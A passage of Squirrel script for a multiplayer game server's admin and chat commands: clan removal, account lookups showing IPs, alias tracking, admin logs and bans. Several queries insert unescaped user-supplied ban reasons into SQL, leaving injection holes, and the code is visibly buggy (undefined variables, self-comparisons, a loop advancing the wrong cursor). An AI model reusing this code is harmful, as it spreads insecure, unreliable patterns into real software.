						local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
						if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player);
						else
						{
							status[player.ID].Level = 1;
							status[player.ID].clan = null;
							QuerySQL(DB, "UPDATE Accounts SET Level = '1' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
							QuerySQL(clan, "DELETE FROM members WHERE player = '"+escapeSQLString(plr.Name.tolower())+"'");
							QuerySQL(DB, "UPDATE Accounts SET clan = null WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
							MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have been removed deom clan: "+GetSQLColumnData(q, 0)+".", player);
							Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" removed player: "+pcol(plr.ID)+plr.Name+white+" from clan: "+GetSQLColumnData(q, 0)+".");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                            QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
						}
					}
				}
				else
				{
					local q3 = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
					if(!q3) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
					else
					{
						local q4 = QuerySQL(clan, "SELECT * FROM members WHERE player = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
						if(!q4) MessagePlayer("[#FF0000]Error:[#FFFFFF] The player is not in clan: "+GetSQLColumnData(q, 1)+".", player);
						else
						{
							QuerySQL(DB, "UPDATE Accounts SET Level = '1' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
							QuerySQL(clan, "DELETE FROM members WHERE player = '"+escapeSQLString(arguments.tolower())+"'");
							QuerySQL(DB, "UPDATE Accounts SET clan = null WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
							Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" removed player:[#D3D3D3] "+GetSQLColumnData(q3, 0)+white+" from clan: "+GetSQLColumnData(q, 0)+".");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                            QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
 						}
					}
				}
			}
		}
	}

	else if(cmd == "clan")
	{
		if(!arguments)
		{
			if(status[player.ID].clan == null) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+playerName+" Clan: Null", player);
			else MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+playerName+" Clan: "+status[player.ID].clan, player);
		}
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr)
			{
				if(status[player.ID].clan == null) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+playerName+" Clan: Null", player);
				else MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+playerName+" Clan: "+status[player.ID].clan, player);
			}
			else
			{
				if(status[plr.ID].clan == null) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" Clan: Null", player);
				else MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" Clan: "+status[plr.ID].clan, player);
			}
		}
	}
	
	else if(cmd == "level")
	{
		if(!arguments)
		{
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+playerName+" Level: "+status[player.ID].Level+" ("+checklvl(status[player.ID].Level)+").", player);
		}
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr)
			{
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+playerName+" Level: "+status[player.ID].Level+" ("+checklvl(status[player.ID].Level)+").", player);
			}
			else
			{
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" Level: "+status[plr.ID].Level+" ("+checklvl(status[plr.ID].Level)+").", player);
			}
		}
	}
	
	else if(cmd == "lastjoined")
	{
		if(!arguments)
		{
			local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
			if(GetSQLColumnData(q, 13) == null) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player: "+playerName+" joined the server first time.", player);
			else MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+playerName+" Last Joined on: "+GetSQLColumnData(q, 13)+".", player);
		}
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" Last Joined on: "+GetSQLColumnData(q, 13)+".", player);
				}
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");	
				if(GetSQLColumnData(q, 13) == null) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" joined the server first time.", player);
				else MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" Last Joined on: "+GetSQLColumnData(q, 13)+".", player);
			}
		}
	}
	else if(cmd == "getaccinfo" || cmd == "getaccountinfo")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Player is not registered.", player)
				else
				{
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" Account Information:", player);
					MessagePlayer(white+"Name: "+GetSQLColumnData(q, 0)+"  Lower Name: "+GetSQLColumnData(q, 1), player);
					MessagePlayer(white+"Level: "+GetSQLColumnData(q, 3)+" ("+checklvl(GetSQLColumnData(q, 3).tointeger())+")", player);
					MessagePlayer(white+"Time Registered: "+GetSQLColumnData(q, 4), player);
					MessagePlayer(white+"UID: "+GetSQLColumnData(q, 5)+"   IP: "+GetSQLColumnData(q, 6), player);
					MessagePlayer(white+"Kills: "+GetSQLColumnData(q, 10)+"  Headshots: "+GetSQLColumnData(q, 11)+"  Deaths: "+GetSQLColumnData(q, 12), player);
					MessagePlayer(white+"Clan: "+GetSQLColumnData(q, 9), player);
					MessagePlayer(white+"Banned: "+GetSQLColumnData(q, 8)+"  Last Joined: "+GetSQLColumnData(q, 13), player);
					MessagePlayer(white+"Ping: "+plr.Ping+"  FPS: "+plr.FPS, player);
				}
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" Account Information:", player);
					MessagePlayer(white+"Name: "+GetSQLColumnData(q, 0)+"  Lower Name: "+GetSQLColumnData(q, 1), player);
					MessagePlayer(white+"Level: "+GetSQLColumnData(q, 3)+" ("+checklvl(GetSQLColumnData(q, 3).tointeger())+")", player);
					MessagePlayer(white+"Time Registered: "+GetSQLColumnData(q, 4), player);
					MessagePlayer(white+"UID: "+GetSQLColumnData(q, 5)+"   IP: "+GetSQLColumnData(q, 6), player);
					MessagePlayer(white+"Kills: "+GetSQLColumnData(q, 10)+"  Headshots: "+GetSQLColumnData(q, 11)+"  Deaths: "+GetSQLColumnData(q, 12), player);
					MessagePlayer(white+"Clan: "+GetSQLColumnData(q, 9), player);
					MessagePlayer(white+"Banned: "+GetSQLColumnData(q, 8)+"  Last Joined: "+GetSQLColumnData(q, 13), player);
				}
			}
		}
	}
    else if ( cmd == "getadminlog" )
    {
        if ( status[ player.ID ].Level < 5 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Unauthorized access.", player );
        else
        {
            local q = QuerySQL( DB, "SELECT * FROM AdminLog" ), a;
            while( GetSQLColumnData( q, 0 ) != null )
            {
                if( a ) a = a + "\n[#FFDD00]"+ GetSQLColumnData( q, 3 ) +":[#D3D3D3] "+ GetSQLColumnData( q, 0 ) + white +" ("+ GetSQLColumnData( q, 1 ) +") used [#D3D3D3]/"+ GetSQLColumnData( q, 4 ) + white +" to [#D3D3D3]"+ GetSQLColumnData( q, 2 ) + white +" | Reason: [#D3D3D3]"+ GetSQLColumnData( q, 5 ) + white +".";
                else a = "[#FFDD00]"+ GetSQLColumnData( q, 3 ) +":[#D3D3D3] "+ GetSQLColumnData( q, 0 ) + white +" ("+ GetSQLColumnData( q, 1 ) +") used [#D3D3D3]/"+ GetSQLColumnData( q, 4 ) + white +" to [#D3D3D3]"+ GetSQLColumnData( q, 2 ) + white +" | Reason: [#D3D3D3]"+ GetSQLColumnData( q, 5 ) + white +".";
                GetSQLNextRow( q );
            }
            FreeSQLQuery( q );
            if ( !a ) return MessagePlayer( "[#FF0000]Error:[#FFFFFF] There's no records yet in the database.", player );
            MessagePlayer( "[#FFDD33]Information:[#FFFFFF] "+ a +"", player );
        }
	}
	
	else if(cmd == "alias")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(plr)
			{
				local a = "", b = "", c = ""; 
				local q = QuerySQL(DB, "SELECT * FROM Accounts");
				while(GetSQLColumnData(q, 0))
				{
					if(GetSQLColumnData(q, 6) == plr.IP && GetSQLColumnData(q, 5) == plr.UID)
					{
						if(a == "") a = GetSQLColumnData(q, 0);
						else a = a+", "+GetSQLColumnData(q, 0);
					}
					if(GetSQLColumnData(q, 6) != plr.IP && GetSQLColumnData(q, 5) == plr.UID)
					{
						if(b == "") b = GetSQLColumnData(q, 0);
						else b = b+", "+GetSQLColumnData(q, 0);
					}
					if(GetSQLColumnData(q, 6) == plr.IP && GetSQLColumnData(q, 5) != plr.UID)
					{
						if(c == "") c = GetSQLColumnData(q, 0);
						else c = c+", "+GetSQLColumnData(q, 0);
					}
					GetSQLNextRow(q);
				}
				local q2 = QuerySQL(DB, "SELECT * FROM Unregistered");
				while(GetSQLColumnData(q2, 0))
				{
					if(GetSQLColumnData(q2, 3) == plr.IP && GetSQLColumnData(q2, 2) == plr.UID)
					{
						if(a == "") a = GetSQLColumnData(q2, 0);
						else a = a+", "+GetSQLColumnData(q2, 0);
					}
					if(GetSQLColumnData(q2, 3) != plr.IP && GetSQLColumnData(q2, 2) == plr.UID)
					{
						if(b == "") b = GetSQLColumnData(q2, 0);
						else b = b+", "+GetSQLColumnData(q2, 0);
					}
					if(GetSQLColumnData(q2, 6) == plr.IP && GetSQLColumnData(q2, 2) != plr.UID)
					{
						if(c == "") c = GetSQLColumnData(q2, 0);
						else c = c+", "+GetSQLColumnData(q2, 0);
					}
					GetSQLNextRow(q);
				}
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" Alias:", player);
				MessagePlayer(white+"Same IP from Same Computer: "+a, player);
				MessagePlayer(white+"Different IP from Same Computer: "+b, player);
				MessagePlayer(white+"Same IP from Different Computer: "+c, player);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
			}
			else
			{
				local q3 = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				local q4 = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
				if(!q3 && !q4) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					local a = "", b = "", c = ""; 
					local q = QuerySQL(DB, "SELECT * FROM Accounts");
					while(GetSQLColumnData(q, 0))
					{
						if(GetSQLColumnData(q, 6) == GetSQLColumnData(q2, 6) && GetSQLColumnData(q, 5) == GetSQLColumnData(q2, 5))
						{
							if(a == "") a = GetSQLColumnData(q, 0);
							else a = a+", "+GetSQLColumnData(q, 0);
						}
						if(GetSQLColumnData(q, 6) != GetSQLColumnData(q2, 6) && GetSQLColumnData(q, 5) == GetSQLColumnData(q2, 5))
						{
							if(b == "") b = GetSQLColumnData(q, 0);
							else b = b+", "+GetSQLColumnData(q, 0);
						}
						if(GetSQLColumnData(q, 6) == GetSQLColumnData(q2, 6) && GetSQLColumnData(q, 5) != GetSQLColumnData(q2, 5))
						{
							if(c == "") c = GetSQLColumnData(q, 0);
							else c = c+", "+GetSQLColumnData(q, 0);
						}
						GetSQLNextRow(q);
					}
					local q5 = QuerySQL(DB, "SELECT * FROM Unregistered");
					while(GetSQLColumnData(q2, 0))
					{
						if(GetSQLColumnData(q5, 3) == GetSQLColumnData(q5, 3) && GetSQLColumnData(q5, 2) == GetSQLColumnData(q5, 2))
						{
							if(a == "") a = GetSQLColumnData(q2, 0);
							else a = a+", "+GetSQLColumnData(q2, 0);
						}
						if(GetSQLColumnData(q5, 3) != GetSQLColumnData(q5, 3) && GetSQLColumnData(q5, 2) == GetSQLColumnData(q5, 2))
						{
							if(b == "") b = GetSQLColumnData(q2, 0);
							else b = b+", "+GetSQLColumnData(q2, 0);
						}
						if(GetSQLColumnData(q2, 6) == GetSQLColumnData(q5, 3) && GetSQLColumnData(q5, 2) != GetSQLColumnData(q5, 2))
						{
							if(c == "") c = GetSQLColumnData(q2, 0);
							else c = c+", "+GetSQLColumnData(q2, 0);
						}
						GetSQLNextRow(q);
					}
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: [#D3D3D3]"+GetSQLColumnData(q2, 0)+white+" Alias:", player);
					MessagePlayer(white+"Same IP from Same Computer: "+a, player);
					MessagePlayer(white+"Different IP from Same Computer: "+b, player);
					MessagePlayer(white+"Same IP from Different Computer: "+c, player);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
				}
			}
		}
	}
	else if(cmd == "clanchat" || cmd == "cc")
	{
		if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <text>", player);
		else if(status[player.ID].clan == null) MessagePlayer("[#FF0000]Error:[#FFFFFF] You are not in a clan.", player);
		else
		{
			for(local i = 0; i<= GetMaxPlayers(); i++)
			{
				local plr = FindPlayer(i);
				if(plr && status[plr.ID].clan == status[player.ID].clan) MessagePlayer("[#33DD33][CLAN CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
			}
			for(local i = 0; i <= GetMaxPlayers(); i++)
			{
				local plr = FindPlayer(i);
				if(plr && status[plr.ID].Level == 6)
				MessagePlayer("[#FF00FF]Clan Chat "+pcol(player.ID)+player.Name+white+": "+message, plr)
			}

		}
	}
	else if(cmd == "teamchat")
	{
		if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <text>", player);
		else
		{
			for(local i = 0; i<= GetMaxPlayers(); i++)
			{
				local plr = FindPlayer(i);
				if(plr && plr.Team == player.Team) MessagePlayer("[#CC33CC][TEAM CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
			for(local i = 0; i <= GetMaxPlayers(); i++)
			{
				local plr = FindPlayer(i);
				if(plr && status[plr.ID].Level == 6)
				MessagePlayer("[#FF00FF]Team Chat "+pcol(player.ID)+player.Name+white+": "+message, plr)
			}
			}
		}
	}

	else if (cmd == "adminchat" || cmd == "adminschat" || cmd == "ac" )
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /" + bas+cmd + " <text>", player);
		else
		{
			local plr;
			for( local i = 0; i <= GetMaxPlayers(); i++ )
			{
				plr = FindPlayer( i );
				if ( ( plr ) && ( status[ plr.ID ].Level >= 5 ) )
				{
					MessagePlayer("[#7B09C6][Admin Chat]: " + playerName + ": " + arguments + ".", plr);
				}
			}
		}
	}


	
	else if(cmd == "nameban")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <reason>", player);
		else
		{
			local now = date();
			local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
			local plr = FindPlayer(GetTok(arguments, " ", 2));
			if(plr)
			{
				QuerySQL(ban, "INSERT INTO nameban (name, admin, date, reason) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(q) QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Name-Banned player: "+pcol(plr.ID)+plr.Name+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", plr);
				KickPlayer(plr);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );
			}
			else
			{
				QuerySQL(ban, "INSERT INTO nameban (name, admin, date, reason) VALUES ('"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
                 local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
               QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( GetTok( arguments, " ", 1 ) ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
				if(q)
				{
					QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Name-Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
				}
				else Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Name-Banned player: [#D3D3D3]"+GetTok(arguments, " ", 1)+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
			}
		}
	}
	
	else if(cmd == "permaban")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <reason>", player);
		else
		{
			local now = date();
			local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
			local plr = FindPlayer(GetTok(arguments, " ", 2));
			if(plr)
			{
				QuerySQL(ban, "INSERT INTO permaban (name, admin, date, UID, reason) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+plr.UID+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(q) QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Permanently Banned player: "+pcol(plr.ID)+plr.Name+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", plr);
				local uid = plr.UID;
				KickPlayer(plr);
				for(local i=0; i<=GetMaxPlayers(); i++)
				{
					local plar = FindPlayer(i);
					if(plar && plar.UID == uid) KickPlayer(plar);
				}
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
				if(q)
				{
					QuerySQL(ban, "INSERT INTO permaban (name, admin, date, UID, reason) VALUES ('"+escapeSQLString(GetSQLColumnData(q, 1).tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+GetSQLColumnData(q, 5)+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
					QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetSQLColumnData(q, 1).tolower())+"'");
					MessagePlayer("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Permanently Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".", player);
					QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
					local uid = GetSQLColumnData(q, 6);
					for(local i=0; i<=GetMaxPlayers(); i++)
					{
						local plar = FindPlayer(i);
						if(plar && plar.UID == uid) KickPlayer(plar);
					}
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
							QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( GetTok( arguments, " ", 1 ) ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );				
				}
				else
				{
				
					local q2 = QuerySQL(DB, "SELECT * FROM Unregistered WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
					if(!q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
					else
					{
						QuerySQL(ban, "INSERT INTO permaban (name, admin, date, UID, reason) VALUES ('"+escapeSQLString(GetSQLColumnData(q2, 1).tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+GetSQLColumnData(q, 5)+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
						MessagePlayer("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Permanently Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".", player);
						local uid = GetSQLColumnData(q, 6);
						for(local i=0; i<=GetMaxPlayers(); i++)
						{
							local plar = FindPlayer(i);
							if(plar && plar.UID == uid) KickPlayer(plar);
						}
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
							QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( GetTok( arguments, " ", 1 ) ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );				
					}
				}
			}
		}
	}
	else if(cmd == "tempban")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 3) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <days 1 - 100> <reason>", player);
		else if(!IsNum(GetTok(arguments, " ", 2)) || GetTok(arguments, " ", 2).tointeger() < 0 || GetTok(arguments, " ", 2).tointeger() > 100) MessagePlayer("[#FF0000]Error:[#FFFFFF] Days should be in numbers and between 1 to 100.", player);
		else
		{
			local now = date();
			local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(plr)
			{
				QuerySQL(ban, "INSERT INTO tempban (name, admin, date, UID, duration, expire, reason) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+plr.UID+"', '"+GetTok(arguments, " ", 2)+"', '"+addbantime(GetTok(arguments, " ", 2).tointeger())+"', '"+GetTok(arguments, " ", 3, NumTok(arguments, " "))+"') ");
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				if(q) 
				QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Banned player: "+pcol(plr.ID)+plr.Name+white+" for: "+GetTok(arguments, " ", 2)+" days Reason: "+GetTok(arguments, " ", 3, NumTok(arguments, " "))+".");
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", plr);
				local uid = plr.UID;
				KickPlayer(plr);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 3, NumTok( arguments, " " ) ) +"' ) " );
				for(local i=0; i<=GetMaxPlayers(); i++)
				{
					local plar = FindPlayer(i);
					if(plar && plar.UID == uid) KickPlayer(plar);
				}
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
				if(q)
				{
					QuerySQL(ban, "INSERT INTO tempban (name, admin, date, UID, duration, expire, reason) VALUES ('"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+GetSQLColumnData(q, 6)+"', '"+GetTok(arguments, " ", 2)+"', '"+addbantime(GetTok(arguments, " ", 2).tointeger())+"', '"+GetTok(arguments, " ", 3, NumTok(arguments, " "))+"') ");
					QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" for: "+GetTok(arguments, " ", 2)+" days Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
						QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q2, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 3, NumTok( arguments, " " ) ) +"' ) " );
